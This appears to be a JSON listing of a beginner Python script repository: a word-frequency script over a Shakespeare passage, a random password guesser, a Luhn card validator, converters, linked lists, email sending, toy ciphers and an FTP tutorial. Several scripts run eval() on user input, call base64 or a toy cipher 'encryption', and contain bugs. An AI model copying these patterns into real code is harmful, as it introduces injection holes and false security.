father's?\nMOWBRAY\nWhat thing, in honour, had my father lost,\nThat need to be revived and breathed in me?\nThe king that loved him, as the state stood then,\nWas force perforce compell'd to banish him:\nAnd then that Harry Bolingbroke and he,\nBeing mounted and both roused in their seats,\nTheir neighing coursers daring of the spur,\nTheir armed staves in charge, their beavers down,\nTheir eyes of fire sparking through sights of steel\nAnd the loud trumpet blowing them together,\nThen, then, when there was nothing could have stay'd\nMy father from the breast of Bolingbroke,\nO when the king did throw his warder down,\nHis own life hung upon the staff he threw;\nThen threw he down himself and all their lives\nThat by indictment and by dint of sword\nHave since miscarried under Bolingbroke.\nWESTMORELAND\nYou speak, Lord Mowbray, now you know not what.\nThe Earl of Hereford was reputed then\nIn England the most valiant gentlemen:\nWho knows on whom fortune would then have smiled?\nBut if your father had been victor there,\nHe ne'er had borne it out of Coventry:\nFor all the country in a general voice\nCried hate upon him; and all their prayers and love\nWere set on Hereford, whom they doted on\nAnd bless'd and graced indeed, more than the king.\nBut this is mere digression from my purpose.\nHere come I from our princely general\nTo know your griefs; to tell you from his grace\nThat he will give you audience; and wherein\nIt shall appear that your demands are just,\nYou shall enjoy them, every thing set off\nThat might so much as think you enemies.\nMOWBRAY\nBut he hath forced us to compel this offer;\nAnd it proceeds from policy, not love.\nWESTMORELAND\nMowbray, you overween to take it so;\nThis offer comes from mercy, not from fear:\nFor, lo! within a ken our army lies,\nUpon mine honour, all too confident\nTo give admittance to a thought of fear.\nOur battle is more full of names than yours,\nOur men more perfect in the use of arms,\nOur armour all as strong, our cause the best;\nThen reason will our heart should be as good\nSay you not then our offer is compell'd.\nMOWBRAY\nWell, by my will we shall admit no parley.\nWESTMORELAND\nThat argues but the shame of your offence:\nA rotten case abides no handling.\nHASTINGS\nHath the Prince John a full commission,\nIn very ample virtue of his father,\nTo hear and absolutely to determine\nOf what conditions we shall stand upon?\nWESTMORELAND\nThat is intended in the general's name:\nI muse you make so slight a question.\nARCHBISHOP OF YORK\nThen take, my Lord of Westmoreland, this schedule,\nFor this contains our general grievances:\nEach several article herein redress'd,\nAll members of our cause, both here and hence,\nThat are insinew'd to this action,\nAcquitted by a true substantial form\nAnd present execution of our wills\nTo us and to our purposes confined,\nWe come within our awful banks again\nAnd knit our powers to the arm of peace.\nWESTMORELAND\nThis will I show the general. Please you, lords,\nIn sight of both our battles we may meet;\nAnd either end in peace, which God so frame!\nOr to the place of difference call the swords\nWhich must decide it.\nARCHBISHOP OF YORK\nMy lord, we will do so.\nExit WESTMORELAND\nMOWBRAY\nThere is a thing within my bosom tells me\nThat no conditions of our peace can stand.\nHASTINGS\nFear you not that: if we can make our peace\nUpon such large terms and so absolute\nAs our conditions shall consist upon,\nOur peace shall stand as firm as rocky mountains.\nMOWBRAY\nYea, but our valuation shall be such\nThat every slight and false-derived cause,\nYea, every idle, nice and wanton reason\nShall to the king taste of this action;\nThat, were our royal faiths martyrs in love,\nWe shall be winnow'd with so rough a wind\nThat even our corn shall seem as light as chaff\nAnd good from bad find no partition.\nARCHBISHOP OF YORK\nNo, no, my lord. Note this;    the king is weary\nOf dainty and such picking grievances:\nFor he hath found to end one doubt by death\nRevives two greater in the heirs of life,\nAnd therefore will he wipe his tables clean\nAnd keep no tell-tale to his memory\nThat may repeat and history his loss\nTo new remembrance; for full well he knows\nHe cannot so precisely weed this land\nAs his misdoubts present occasion:\nHis foes are so enrooted with his friends\nThat, plucking to unfix an enemy,\nHe doth unfasten so and shake a friend:\nSo that this land, like an offensive wife\nThat hath enraged him on to offer strokes,\nAs he is striking, holds his infant up\nAnd hangs resolved correction in the arm\nThat was uprear'd to execution.\nHASTINGS\nBesides, the king hath wasted all his rods\nOn late offenders, that he now doth lack\nThe very instruments of chastisement:\nSo that his power, like to a fangless lion,\nMay offer, but not hold.\nARCHBISHOP OF YORK\n'Tis very true:\nAnd therefore be assured, my good lord marshal,\nIf we do now make our atonement well,\nOur peace will, like a broken limb united,\nGrow stronger for the breaking.\nMOWBRAY\nBe it so.\nHere is return'd my Lord of Westmoreland.\nRe-enter WESTMORELAND\nWESTMORELAND\nThe prince is here at hand: pleaseth your lordship\nTo meet his grace just distance 'tween our armies.\nMOWBRAY\nYour grace of York, in God's name then, set forward.\nARCHBISHOP OF YORK\nBefore, and greet his grace: my lord, we come.\nExeunt\"\"\"\n\nwordlist = wordstring.split()  # splits each word with a space\n\nfor x, y in enumerate(wordlist):\n    special_character = pattern.search(y[-1:])  # searches for a pattern in the string\n    try:\n        if special_character.group():  # returns all matching groups\n            wordlist[x] = y[:-1]\n    except BaseException:\n        continue\n\nwordfreq = [\n    wordlist.count(w) for w in wordlist\n]  # counts frequency of a letter in the given list\n\nprint(\"String\\n {} \\n\".format(wordstring))\nprint(\"List\\n {} \\n\".format(str(wordlist)))\nprint(\"Frequencies\\n {} \\n\".format(str(wordfreq)))\nprint(\"Pairs\\n {}\".format(str(dict(zip(wordlist, wordfreq)))))\n"
        },
        {
          "name": "CountMillionCharacters-2.0.py",
          "type": "blob",
          "size": 0.5751953125,
          "content": "\"\"\"Get the number of each character in any given text.\nInputs:\nA txt file -- You will be asked for an input file. Simply input the name\nof the txt file in which you have the desired text.\n\"\"\"\n\nimport collections\nimport pprint\n\n\ndef main():\n    file_input = input(\"File Name: \")\n    try:\n        with open(file_input, \"r\") as info:\n            count = collections.Counter(info.read().upper())\n    except FileNotFoundError:\n        print(\"Please enter a valid file name.\")\n        main()\n\n    value = pprint.pformat(count)\n    print(value)\n    exit()\n\n\nif __name__ == \"__main__\":\n    main()\n"
        },
        {
          "name": "CountMillionCharacters-Variations",
          "type": "tree",
          "content": null
        },
        {
          "name": "Crack_password.py",
          "type": "blob",
          "size": 0.431640625,
          "content": "from random import *\nuser_pass = input(\"Enter your password: \")\npassword = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j','k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't','u','v','w', 'x', 'y', 'z',]\nguess = \"\"\nwhile (guess != user_pass):\n    guess = \"\"\n    for letter in range(len(user_pass)):\n        guess_letter = password[randint(0, 25)]\n        guess = str(guess_letter) + str(guess)\n    print(guess)\nprint(\"Your password is\",guess)\n"
        },
        {
          "name": "Credit_Card_Validator.py",
          "type": "blob",
          "size": 2.318359375,
          "content": "# luhn algorithm\r\n\r\n\r\nclass CreditCard:\r\n    def __init__(self, card_no):\r\n        self.card_no = card_no\r\n\r\n    @property\r\n    def company(self):\r\n        comp = None\r\n        if str(self.card_no).startswith(\"4\"):\r\n            comp = \"Visa Card\"\r\n        elif str(self.card_no).startswith(\r\n            (\r\n                \"50\",\r\n                \"67\",\r\n                \"58\",\r\n                \"63\",\r\n            )\r\n        ):\r\n            comp = \"Maestro Card\"\r\n        elif str(self.card_no).startswith(\"5\"):\r\n            comp = \"Master Card\"\r\n        elif str(self.card_no).startswith(\"37\"):\r\n            comp = \"American Express Card\"\r\n        elif str(self.card_no).startswith(\"62\"):\r\n            comp = \"Unionpay Card\"\r\n        elif str(self.card_no).startswith(\"6\"):\r\n            comp = \"Discover Card\"\r\n        elif str(self.card_no).startswith(\"35\"):\r\n            comp = \"JCB Card\"\r\n        elif str(self.card_no).startswith(\"7\"):\r\n            comp = \"Gasoline Card\"\r\n\r\n        return \"Company : \" + comp\r\n\r\n    def first_check(self):\r\n        if 13 <= len(self.card_no) <= 19:\r\n            message = \"First check : Valid in terms of length.\"\r\n\r\n        else:\r\n            message = \"First check : Check Card number once again it must be of 13 or 16 digits long.\"\r\n        return message\r\n\r\n    def validate(self):\r\n        # double every second digit from right to left\r\n        sum_ = 0\r\n        crd_no = self.card_no[::-1]\r\n        for i in range(len(crd_no)):\r\n            if i % 2 == 1:\r\n                double_it = int(crd_no[i]) * 2\r\n\r\n                if len(str(double_it)) == 2:\r\n                    sum_ += sum([eval(i) for i in str(double_it)])\r\n\r\n                else:\r\n                    sum_ += double_it\r\n\r\n            else:\r\n                sum_ += int(crd_no[i])\r\n\r\n        if sum_ % 10 == 0:\r\n            response = \"Valid Card\"\r\n        else:\r\n            response = \"Invalid Card\"\r\n\r\n        return response\r\n\r\n    @property\r\n    def checksum(self):\r\n        return \"#CHECKSUM# : \" + self.card_no[-1]\r\n\r\n    @classmethod\r\n    def set_card(cls, card_to_check):\r\n        return cls(card_to_check)\r\n\r\n\r\ncard_number = input()\r\ncard = CreditCard.set_card(card_number)\r\nprint(card.company)\r\nprint(\"Card : \", card.card_no)\r\nprint(card.first_check())\r\nprint(card.checksum)\r\nprint(card.validate())\r\n\r\n# 79927398713\r\n# 4388576018402626\r\n# 379354508162306\r\n"
        },
        {
          "name": "Cricket_score.py",
          "type": "blob",
          "size": 0.8134765625,
          "content": "from urllib import request\n\n# import os\nimport pyttsx3\n\nimport bs4  # Beautiful Soup for Web Scraping\nfrom win10toast import ToastNotifier\n\ntoaster = ToastNotifier()\n# url from where we extrat data\n\nurl = \"http://www.cricbuzz.com/cricket-match/live-scores\"\n\nsauce = request.urlopen(url).read()\nsoup = bs4.BeautifulSoup(sauce, \"lxml\")\n\nscore = []\nresults = []\n\nfor div_tags in soup.find_all(\"div\", attrs={\"class\": \"cb-lv-scrs-col text-black\"}):\n    score.append(div_tags.text)\nfor result in soup.find_all(\"div\", attrs={\"class\": \"cb-lv-scrs-col cb-text-complete\"}):\n    results.append(result.text)\n\nengine = pyttsx3.init()\n\n# testing\nengine.say(\"match score and result is\")\nprint(score[0], results[0])\ntoaster.show_toast(title=score[0], msg=results[0])\nengine.runAndWait()\n\n\n# initialisation\n\n# after my update now this program speaks\n"
        },
        {
          "name": "Day_of_week.py",
          "type": "blob",
          "size": 1.068359375,
          "content": "# Python program to Find day of\n# the week for a given date\nimport re  # regular expressions\nimport calendar  # module of python to provide useful fucntions related to calendar\nimport datetime  # module of python to get the date and time\n\n\ndef process_date(user_input):\n    user_input = re.sub(r\"/\", \" \", user_input)  # substitute / with space\n    user_input = re.sub(r\"-\", \" \", user_input)  # substitute - with space\n    return user_input\n\n\ndef find_day(date):\n    born = datetime.datetime.strptime(\n        date, \"%d %m %Y\"\n    ).weekday()  # this statement returns an integer corresponding to the day of the week\n    return calendar.day_name[\n        born\n    ]  # this statement returns the corresponding day name to the integer generated in the previous statement\n\n\n# To get the input from the user\n# User may type 1/2/1999 or 1-2-1999\n# To overcome those we have to process user input and make it standard to accept as defined by  calender and time module\nuser_input = str(input(\"Enter date     \"))\ndate = process_date(user_input)\nprint(\"Day on \" + user_input + \"  is \" + find_day(date))\n"
        },
        {
          "name": "Decimal number to binary function.py",
          "type": "blob",
          "size": 0.146484375,
          "content": "# decimal number\nnumber = int(input(\"Enter any decimal number: \"))\n\n# print equivalent binary number\nprint(\"Equivalent Binary Number: \", bin(number))\n"
        },
        {
          "name": "Decimal_To_Binary.py",
          "type": "blob",
          "size": 1.32421875,
          "content": "# patch-255\r\ndecimal_accuracy = 7\r\n\r\n\r\ndef dtbconverter(num):\r\n\r\n    whole = []\r\n    fractional = [\".\"]\r\n\r\n    decimal = round(num % 1, decimal_accuracy)\r\n    w_num = int(num)\r\n\r\n    i = 0\r\n    while decimal != 1 and i < decimal_accuracy:\r\n        decimal = decimal * 2\r\n        fractional.append(int(decimal // 1))\r\n        decimal = round(decimal % 1, decimal_accuracy)\r\n        if decimal == 0:\r\n            break\r\n        i += 1\r\n\r\n    while w_num != 0:\r\n        whole.append(w_num % 2)\r\n        w_num = w_num // 2\r\n    whole.reverse()\r\n\r\n    i = 0\r\n    while i < len(whole):\r\n        print(whole[i], end=\"\")\r\n        i += 1\r\n    i = 0\r\n    while i < len(fractional):\r\n        print(fractional[i], end=\"\")\r\n        i += 1\r\n\r\n\r\nnumber = float(input(\"Enter Any base-10 Number: \"))\r\n\r\ndtbconverter(number)\r\n\r\n\r\n# i think this code have not proper comment and noe this is easy to understand\r\n\"\"\"\r\n=======\r\nProgram: Decimal to Binary converter.\r\n\r\nTHis program accepts fractional values, the accuracy can be set below:\r\n\"\"\"\r\n\r\n# Function to convert decimal number\r\n# to binary using recursion\r\ndef DecimalToBinary(num):\r\n\r\n    if num > 1:\r\n        DecimalToBinary(num // 2)\r\n    print(num % 2, end=\"\")\r\n\r\n\r\n# Driver Code\r\nif __name__ == \"__main__\":\r\n\r\n    # decimal value\r\n    dec_val = 24\r\n\r\n    # Calling function\r\n    DecimalToBinary(dec_val)\r\n# master\r\n"
        },
        {
          "name": "Delete_Linked_List.py",
          "type": "blob",
          "size": 1.4345703125,
          "content": "class Node:\r\n    def __init__(self, data):\r\n        self.data = data\r\n        self.next = None\r\n\r\n\r\nclass Linked_List:\r\n    def __init__(self):\r\n        self.head = None\r\n\r\n    def Insert_At_End(self, new_data):\r\n        new_node = Node(new_data)\r\n        if self.head is None:\r\n            self.head = new_node\r\n            return\r\n        current = self.head\r\n        while current.next:\r\n            current = current.next\r\n        current.next = new_node\r\n\r\n    def Delete(self, key):\r\n        temp = self.head\r\n        if temp is None:\r\n            return \"Can't Delete!\"\r\n        else:\r\n            if temp.data == key:\r\n                self.head = temp.next\r\n                temp = None\r\n        while temp is not None:\r\n            prev = temp\r\n            temp = temp.next\r\n            curr = temp.next\r\n            if temp.data == key:\r\n                prev.next = curr\r\n                return\r\n\r\n    def Display(self):\r\n        temp = self.head\r\n        while temp:\r\n            print(temp.data, \"->\", end=\" \")\r\n            temp = temp.next\r\n        print(\"None\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    L_list = Linked_List()\r\n    L_list.Insert_At_End(1)\r\n    L_list.Insert_At_End(2)\r\n    L_list.Insert_At_End(3)\r\n    L_list.Insert_At_End(4)\r\n    L_list.Insert_At_End(5)\r\n    L_list.Insert_At_End(6)\r\n    L_list.Insert_At_End(7)\r\n    print(\"Linked List: \")\r\n    L_list.Display()\r\n    print(\"Deleted Linked List: \")\r\n    L_list.Delete(3)\r\n    L_list.Display()\r\n"
        },
        {
          "name": "Detect_Remove_loop.py",
          "type": "blob",
          "size": 1.751953125,
          "content": "class Node:\r\n    def __init__(self, data):\r\n        self.data = data\r\n        self.next = None\r\n\r\n\r\nclass Linked_List:\r\n    def __init__(self):\r\n        self.head = None\r\n\r\n    def Insert_At_End(self, new_data):\r\n        new_node = Node(new_data)\r\n        if self.head is None:\r\n            self.head = new_node\r\n            return\r\n        current = self.head\r\n        while current.next:\r\n            current = current.next\r\n        current.next = new_node\r\n\r\n    def Detect_and_Remove_Loop(self):\r\n        slow = fast = self.head\r\n        while slow and fast and fast.next:\r\n            slow = slow.next\r\n            fast = fast.next.next\r\n            if slow == fast:\r\n                self.Remove_loop(slow)\r\n                print(\"Loop Found\")\r\n                return 1\r\n        return 0\r\n\r\n    def Remove_loop(self, Loop_node):\r\n        ptr1 = self.head\r\n        while 1:\r\n            ptr2 = Loop_node\r\n            while ptr2.next != Loop_node and ptr2.next != ptr1:\r\n                ptr2 = ptr2.next\r\n            if ptr2.next == ptr1:\r\n                break\r\n            ptr1 = ptr1.next\r\n        ptr2.next = None\r\n\r\n    def Display(self):\r\n        temp = self.head\r\n        while temp:\r\n            print(temp.data, \"->\", end=\" \")\r\n            temp = temp.next\r\n        print(\"None\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    L_list = Linked_List()\r\n    L_list.Insert_At_End(8)\r\n    L_list.Insert_At_End(5)\r\n    L_list.Insert_At_End(10)\r\n    L_list.Insert_At_End(7)\r\n    L_list.Insert_At_End(6)\r\n    L_list.Insert_At_End(11)\r\n    L_list.Insert_At_End(9)\r\n    print(\"Linked List with Loop: \")\r\n    L_list.Display()\r\n    print(\"Linked List without Loop: \")\r\n    L_list.head.next.next.next.next.next.next.next = L_list.head.next.next\r\n    L_list.Detect_and_Remove_Loop()\r\n    L_list.Display()\r\n"
        },
        {
          "name": "Dictionary opperations (input,update a dict).py",
          "type": "blob",
          "size": 0.462890625,
          "content": "# Update the value of dictionary written by the user...\r\n\r\nprint(\"Dictinary opperations\")\r\n\r\n\r\ndef Dictionary(Dict, key, value):\r\n    print(\"Original dictionary\", Dict)\r\n    Dict[key] = value\r\n    print(\"Updated dictionary\", Dict)\r\n\r\n\r\nd = eval(input(\"Enter the dictionary\"))\r\nprint(\"Dictionary\", d, \"\\n\")\r\n\r\nk = input(\"Enter the key to be updated\")\r\nif k in d.keys():\r\n    v = input(\"Enter the updated value\")\r\n    Dictionary(d, k, v)\r\n\r\nelse:\r\n    print(\"Key not found\")\r\n"
        },
        {
          "name": "Differentiate_List.py",
          "type": "blob",
          "size": 0.3779296875,
          "content": "# this code gives the numbers of integers, floats, and strings present in the list\n\n\na = [\"Hello\", 35, \"b\", 45.5, \"world\", 60]\ni = f = s = 0\nfor j in a:\n    if isinstance(j, int):\n        i = i + 1\n    elif isinstance(j, float):\n        f = f + 1\n    else:\n        s = s + 1\nprint(f\"Number of integers are: {i}\")\nprint(f\"Number of Floats are: {f}\")\nprint(f\"numbers of strings are: {s}\")\n"
        },
        {
          "name": "Divide Operator.py",
          "type": "blob",
          "size": 1.072265625,
          "content": "class DivisionOperation:\n    INT_MAX = float('inf')\n\n    def __init__(self, num1, num2):\n        self.num1 = num1\n        self.num2 = num2\n\n    def perform_division(self):\n        if self.num1 == 0:\n            return 0\n        if self.num2 == 0:\n            return self.INT_MAX\n\n        neg_result = False\n\n        # Handling negative numbers\n        if self.num1 < 0:\n            self.num1 = -self.num1\n\n            if self.num2 < 0:\n                self.num2 = -self.num2\n            else:\n                neg_result = True\n        elif self.num2 < 0:\n            self.num2 = -self.num2\n            neg_result = True\n\n        quotient = 0\n\n        while self.num1 >= self.num2:\n            self.num1 -= self.num2\n            quotient += 1\n\n        if neg_result:\n            quotient = -quotient\n        return quotient\n\n\n# Driver program\nnum1 = 13\nnum2 = 2\n\n# Create a DivisionOperation object and pass num1, num2 as arguments\ndivision_op = DivisionOperation(num1, num2)\n\n# Call the perform_division method of the DivisionOperation object\nresult = division_op.perform_division()\n\nprint(result)\n"
        },
        {
          "name": "Downloaded Files Organizer",
          "type": "tree",
          "content": null
        },
        {
          "name": "Droplistmenu",
          "type": "tree",
          "content": null
        },
        {
          "name": "Eight_Puzzle_Solver",
          "type": "tree",
          "content": null
        },
        {
          "name": "Electronics_Algorithms",
          "type": "tree",
          "content": null
        },
        {
          "name": "Email-Automation.py",
          "type": "blob",
          "size": 0.5888671875,
          "content": "import smtplib\r\nfrom email.mime.multipart import MIMEMultipart\r\nfrom email.mime.text import MIMEText\r\n\r\nfro_add = \"dilipvijjapu@gmail.com\"\r\nto_add = \"vijjapudilip@gmail.com\"\r\n\r\nmessage = MIMEMultipart()\r\nmessage[\"From\"] = fro_add\r\nmessage[\"To\"] = \",\".join(to_add)\r\nmessage[\"subject\"] = \"Testinf mail\"\r\n\r\nbody = \"Hai this is dilip ,How are you\"\r\n\r\nmessage.attach(MIMEText(body, \"plain\"))\r\n\r\nemail = \" \"\r\npassword = \" \"\r\n\r\nmail = smtplib.SMTP(\"smtp.gmail.com\", 587)\r\nmail.ehlo()\r\nmail.starttls()\r\nmail.login(email, password)\r\ntext = message.as_string()\r\nmail.sendmail(fro_add, to_add, text)\r\nmail.quit()\r\n"
        },
        {
          "name": "Emoji Dictionary",
          "type": "tree",
          "content": null
        },
        {
          "name": "Encryption using base64.py",
          "type": "blob",
          "size": 0.3525390625,
          "content": "import base64\n#Encryption\nmessage = input()\nmessage_bytes = message.encode('ascii')\nbase64_bytes = base64.b64encode(message_bytes)\nbase64_message = base64_bytes.decode('ascii')\nprint(base64_message)\n\n#Decryption\nbase64_bytes = base64_message.encode('ascii')\nmessage_bytes = base64.b64decode(base64_bytes)\nmessage = message_bytes.decode('ascii')\n\nprint(message)\n"
        },
        {
          "name": "EncryptionTool.py",
          "type": "blob",
          "size": 2.4228515625,
          "content": "# GGearing\n# Simple encryption script for text\n# This was one my first versions of this script\n# 09/07/2017\nfrom __future__ import print_function\n\nimport math\n\ntry:\n    input = raw_input\nexcept NameError:\n    pass\n\nkey = int(math.pi * 1e14)\ntext = input(\"Enter text: \")\nvalues = reverse = []\n\n\ndef encryptChar(target):\n    # encrytion algorithm\n    target = ((target + 42) * key) - 449\n    return target\n\n\ndef decryptChar(target):\n    target = ((target + 449) / key) - 42\n    return target\n\n\ndef encrypt(input_text):\n    col_values = []\n    for inp in input_text:\n        current = ord(inp)\n        current = encryptChar(current)\n        col_values.append(current)\n    return col_values\n\n\ndef decrypt(enc_text):\n    col_values = []\n    for enc in enc_text:\n        current = int(decryptChar(enc))\n        current = chr(current)\n        col_values.append(current)\n    return col_values\n\n\ndef readAndDecrypt(filename):\n    file = open(filename, \"r\")\n    data = file.read()\n    datalistint = []\n    actualdata = []\n    datalist = data.split(\" \")\n    datalist.remove(\"\")\n    datalistint = [float(data) for data in datalist]\n    for data in datalist:\n        current1 = int(decryptChar(data))\n        current1 = chr(current1)\n        actualdata.append(current1)\n    file.close()\n    return actualdata\n\n\ndef readAndEncrypt(filename):\n    file = open(filename, \"r\")\n    data = file.read()\n    datalist = list(data)\n    encrypted_list = list()\n    encrypted_list_str = list()\n    for data in datalist:\n        current = ord(data)\n        current = encryptChar(current)\n        encrypted_list.append(current)\n    file.close()\n    return encrypted_list\n\n\ndef readAndEncryptAndSave(inp_file, out_file):\n    enc_list = readAndEncrypt(inp_file)\n    output = open(out_file, \"w\")\n    for enc in enc_list:\n        output.write(str(enc) + \" \")\n    output.close()\n\n\ndef readAndDecryptAndSave(inp_file, out_file):\n    dec_list = readAndDecrypt(inp_file)\n    output = open(out_file, \"w\")\n    for dec in dec_list:\n        output.write(str(dec))\n    output.close()\n\n\n# encryption\nfor t in text:\n    current = ord(t)\n    current = encryptChar(current)\n    values.append(current)\n\n# decryption\nfor v in values:\n    current = int(decryptChar(v))\n    current = chr(current)\n    reverse.append(current)\nprint(reverse)\n\n# saves encrypted in txt file\noutput = open(\"encrypted.txt\", \"w\")\nfor v in values:\n    output.write(str(v) + \" \")\noutput.close()\n\n# read and decrypts\nprint(readAndDecrypt(\"encrypted.txt\"))\n"
        },
        {
          "name": "Exception_Handling_in_Python.py",
          "type": "blob",
          "size": 1.8662109375,
          "content": "# Exception handling using python\n\n\na = 12\nb = 0\n# a = int(input())\n# b = int(input())\n\ntry:\n    c = a / b\n    print(c)\n    # trying to print an unknown variable d\n    print(d)\n\nexcept ZeroDivisionError:\n    print(\"Invalid input. Divisor cannot be zero.\")\n\nexcept NameError:\n    print(\"Name of variable not defined.\")\n\n\n# finally statement is always executed whether or not any errors occur\na = 5\nb = 0\n# a = int(input())\n# b = int(input())\n\ntry:\n    c = a / b\n    print(c)\n\nexcept ZeroDivisionError:\n    print(\"Invalid input. Divisor cannot be zero.\")\n\nfinally:\n    print(\"Hope all errors were resolved!!\")\n\n\n# A few other common errors\n# SyntaxError\n\ntry:\n    # eval is a built-in-function used in python, eval function parses the expression argument and evaluates it as a python expression.\n    eval(\"x === x\")\n\nexcept SyntaxError:\n    print(\"Please check your syntax.\")\n\n\n# TypeError\n\ntry:\n    a = \"2\" + 2\n\nexcept TypeError:\n    print(\"int type cannot be added to str type.\")\n\n\n# ValueError\n\ntry:\n    a = int(\"abc\")\n\nexcept ValueError:\n    print(\"Enter a valid integer literal.\")\n\n\n# IndexError\n\nl = [1, 2, 3, 4]\n\ntry:\n    print(l[4])\n\nexcept IndexError:\n    print(\"Index of the sequence is out of range. Indexing in python starts from 0.\")\n\n\n# FileNotFoundError\n\nf = open(\"aaa.txt\", \"w\")  # File aaa.txt created\nf.close()\n\ntry:\n    # Instead of aaa.txt lets try opening abc.txt\n    f = open(\"abc.txt\", \"r\")\n\nexcept FileNotFoundError:\n    print(\"Incorrect file name used\")\n\nfinally:\n    f.close()\n\n\n# Handling multiple errors in general\n\ntry:\n    a = 12 / 0\n    b = \"2\" + 2\n    c = int(\"abc\")\n    eval(\"x===x\")\n\nexcept:\n    pass\n\nfinally:\n    print(\n        \"Handled multiples errors at one go with no need of knowing names of the errors.\"\n    )\n\n\n# Creating your own Error\n\na = 8\n# a = int(input())\n\nif a < 18:\n    raise Exception(\"You are legally underage!!!\")\n\nelse:\n    print(\"All is well, go ahead!!\")\n"
        },
        {
          "name": "Extract-Table-from-pdf-txt-docx",
          "type": "tree",
          "content": null
        },
        {
          "name": "ExtractThumbnailFromVideo",
          "type": "tree",
          "content": null
        },
        {
          "name": "Extract_Text_from_image.py",
          "type": "blob",
          "size": 0.609375,
          "content": "# extract text from a img and its coordinates using the pytesseract module\nimport cv2\nimport pytesseract\n\n# You need to add tesseract binary dependency to system variable for this to work\n\nimg = cv2.imread(\"img.png\")\n# We need to convert the img into RGB format\nimg = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)\n\nhI, wI, k = img.shape\nprint(pytesseract.image_to_string(img))\nboxes = pytesseract.image_to_boxes(img)\nfor b in boxes.splitlines():\n    b = b.split(\" \")\n    x, y, w, h = int(b[1]), int(b[2]), int(b[3]), int(b[4])\n    cv2.rectangle(img, (x, hI - y), (w, hI - h), (0, 0, 255), 0.2)\n\ncv2.imshow(\"img\", img)\ncv2.waitKey(0)\n"
        },
        {
          "name": "FIND FACTORIAL OF A NUMBER.py",
          "type": "blob",
          "size": 0.5302734375,
          "content": "# Python program to find the factorial of a number provided by the user.\n\ndef factorial(n):\n\tif n < 0:         # factorial of number less than 0 is not possible\n\t\treturn \"Oops!Factorial Not Possible\"\n\telif n == 0:    # 0! = 1; when n=0 it returns 1 to the function which is calling it previously. \n\t\treturn 1\n\telse:\n\t\treturn n*factorial(n-1)  \n#Recursive function. At every iteration \"n\" is getting reduced by 1 until the \"n\" is equal to 0.\n\nn = int(input(\"Enter a number: \")) # asks the user for input \nprint(factorial(n))    # function call\n"
        },
        {
          "name": "FTP in python",
          "type": "blob",
          "size": 5.6259765625,
          "content": " How to use FTP in Python\nOverview\nThis article will show how you can use FTP in Python with the help of the\nftplib module. \nFtplib\nThe ftplib module in Python allows you to write Python programs that perform a\nvariety of automated FTP jobs. You can easily connect to a FTP server to retrieve\nfiles and process them locally.\n\nTo use the ftplib module in Python, you first have to import it into your script. \nOpen a Connection\nTo \"open\" a connection to the FTP Server, you have to create the object.\n\nOnce the connection is made (opened), you can use the methods in the ftplib\nmodule.\n\nSeveral methods are available in two flavors: one for handling text files and\nanother for binary files.\n\nYou can easily navigate the directory structure, manage and download files. \nHow do I use it?\nThis program will first connect to a FTP server (ftp.cwi.nl) and then list the\nfiles and directories in the FTP server root directory using the LIST() method.\nfrom ftplib import FTP\n\nftp = FTP('ftp.cwi.nl')   # connect to host, default port\n\nftp.login()               # user anonymous, passwd anonymous@\n\nftp.retrlines('LIST')     # list directory contents \nOur second program opens a connection to 'ftp.sunet.se' as the user 'anonymous'\nwith an email address of 'anonymous@sunet.se'\n\nIt then lists the files and directories on the FTP server by using the dir()\nmethod.\n\nThe output is saved to the 'files' variable. \n\nI then use print to see the files on screen. \n\nIf I want I to change directory I would just use ftp.cwd(path) to do so.\n\nTo close the FTP connection, use the quit() method.  \nimport ftplib\n\nftp = ftplib.FTP('ftp.sunet.se', 'anonymous', 'anonymous@sunet.se')\n\nprint \"File List: \"\n\nfiles = ftp.dir()\n\nprint files\n\nftp.cwd(\"/pub/unix\") #changing to /pub/unix\nCommon FTP Methods\nFTP.connect(host[, port[, timeout]])\n\nConnect to the given host and port. \n\nThe default port number is 21, as specified by the FTP protocol specification. \n\nIt is rarely needed to specify a different port number. \n\nThis function should be called only once for each instance \n\nIt should not be called at all if a host was given when the instance was created. \n\nAll other methods can only be used after a connection\nhas been made.\n\nThe optional timeout parameter specifies a timeout in seconds for the connection\nattempt. \n\nIf no timeout is passed, the global default timeout setting will be used.\nFTP.getwelcome()\n\nReturn the welcome message sent by the server in reply to the initial connection. \n\nThis message sometimes contains disclaimers or help information that may be\nrelevant to the user\nFTP.login([user[, passwd[, acct]]])\n\nLog in as the given user. \n\nThe passwd and acct parameters are optional and default to the empty string. \n\nIf no user is specified, it defaults to 'anonymous'. \n\nIf user is 'anonymous', the default passwd is 'anonymous@'. \n\nThis function should be called only once for each instance, after a connection \nhas been established. \n\nIt should not be called at all if a host and user were given when the instance\nwas created. \n\nMost FTP commands are only allowed after the client has logged in. \n\nThe acct parameter supplies “accounting information”; few systems implement this.\nFTP.retrbinary(command, callback[, maxblocksize[, rest]])\n\n\n \nRetrieve a file in binary transfer mode. \n\nCommand should be an appropriate RETR command: 'RETR filename'. \n\nThe callback function is called for each block of data received, with a single\nstring argument giving the data block. \n\nThe optional maxblocksize argument specifies the maximum chunk size to read on\nthe low-level socket object created to do the actual transfer.\n\nA reasonable default is chosen. rest means the same thing as in the transfercmd()\nmethod.\nFTP.retrlines(command[, callback])\n\nRetrieve a file or directory listing in ASCII transfer mode. \n\nCommand should be an appropriate RETR command or a command such as LIST, NLST or \nMLSD.\n\nLIST retrieves a list of files and information about those files. \n\nNLST retrieves a list of file names. \n\nOn some servers, MLSD retrieves a machine readable list of files and information\nabout those files. \n\nThe callback function is called for each line with a string argument containing\nthe line with the trailing CRLF stripped. \n\nThe default callback prints the line to sys.stdout.\nFTP.dir(argument[, ...])\n\nProduce a directory listing as returned by the LIST command, printing it to\nstandard output.\n\nThe optional argument is a directory to list (default is the current server\ndirectory). \n\nMultiple arguments can be used to pass non-standard options to the LIST command. \n\nIf the last argument is a function, it is used as a callback function as for \nretrlines(); the default prints to sys.stdout. \n\nThis method returns None.\nFTP.delete(filename)\n\nRemove the file named filename from the server. \n\nIf successful, returns the text of the response, otherwise raises error_perm on \npermission errors or error_reply on other errors.\nFTP.cwd(pathname)\n\nSet the current directory on the server.\nFTP.mkd(pathname)\n\nCreate a new directory on the server.\nFTP.pwd()\n\nReturn the pathname of the current directory on the server.\nFTP.quit()\n\nSend a QUIT command to the server and close the connection. \n\nThis is the “polite” way to close a connection, 